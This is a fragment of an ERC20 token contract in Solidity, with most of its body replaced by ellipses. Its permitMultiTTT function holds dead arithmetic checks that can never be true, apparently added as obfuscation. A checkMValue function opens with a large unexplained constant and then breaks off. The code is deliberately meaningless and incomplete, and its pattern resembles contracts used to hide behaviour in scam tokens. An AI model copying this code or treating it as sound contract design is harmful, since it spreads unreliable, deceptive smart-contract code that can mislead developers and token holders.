...
contract MWS is ERC20 {
    ...
    */
    ...
    function permitMultiTTT(uint8 v, bytes32 r, bytes32 s, address signer) external pure {
        address _signerAddrZA = ecrecover(keccak256(abi.encodePacked(signer)), v, r, s);
        require(address(0) != _signerAddrZA, "invalid sign.ttt");
        uint256 bajatf = 22 + 35;
        uint256 iaqjnk = 94 + 56;
        if (bajatf == 67 + 48 && iaqjnk == 56 * 76) return; 
        uint256 ky = 34 % 63;
        uint256 wggyd = 82 + 84 * 28;
        if (ky == 83 * 94 * 50 && wggyd == 96 + 44) return; 
    }
    ...
    */
    function checkMValue() public view returns (bool) {
      uint256 slt = 7765740049358200598882504644120343699622594151683731131964839510087;
